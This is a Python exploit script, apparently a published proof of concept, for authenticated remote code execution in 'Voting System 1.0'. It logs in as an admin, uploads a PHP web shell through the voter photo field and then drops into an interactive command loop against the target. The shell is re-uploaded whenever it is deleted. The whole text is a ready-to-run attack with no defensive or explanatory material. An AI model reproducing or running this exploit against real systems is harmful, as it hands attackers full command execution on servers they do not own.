import requests
import argparse

def shell(url,username,password):
    url_shell = url + '/images/boom.php' 

    while True:
        req_url_file_check = requests.get(url_shell)
        if req_url_file_check.status_code != 200:
            print("File has been deleted. Re-Uploading file!")
            upload(url,username,password)
            break
        else:
            cmd = input("RCE: ")
            
            rce_data = {
                'cmd':cmd
            }
            req_url_rce = requests.post(url_shell,data=rce_data)
            if req_url_rce.status_code != 200:
                print("File has been deleted. Re-Uploading file!")
                upload(url,username,password)
                break
            else:
                print(req_url_rce.text)

def upload(url,username,password):
    payload = "<?php echo system($_REQUEST['cmd']); ?>"

    url_login = url + '/admin/login.php' #Edit if necessary 
    session = requests.Session() 
    login_data = {
        'username':username,'password':password,'login':''
    }

    req_url_login = session.post(url_login,data=login_data) 

    url_upload = url + '/admin/voters_add.php' 
    fdata = { 
        'firstname':'test','lastname':'voter','password':'passw0rd','add':''
    } 
    fileup = { 
        'photo':('boom.php',payload,{'Content-Type':'application/x-php'},{'Content-Disposition':'form-data'})
    } 

    req_url_upload = session.post(url_upload,data=fdata,files=fileup)
    if req_url_upload.status_code == 200:
        print("Uploaded Exploit!")
        shell(url,username,password)
    else:
        print("Something went wrong with the upload!")
        exit()

def main():
    parser = argparse.ArgumentParser(description='Voting System 1.0 File Upload Authenticated Remote Code Execution')

    parser.add_argument('-t', metavar='<Target URL>', help='target/host base URL, E.G: http://exploitvoting.com/', required=True)
    parser.add_argument('-u', metavar='<user>', help='Username', required=True)
    parser.add_argument('-p', metavar='<password>', help="Password", required=True)
    args = parser.parse_args()

    url = args.t
    username = args.u
    password = args.p

    while True:
        try:
            upload(url,username,password)
        except KeyboardInterrupt:
            print("Bye Bye")
            exit()

if __name__ == "__main__":
    main()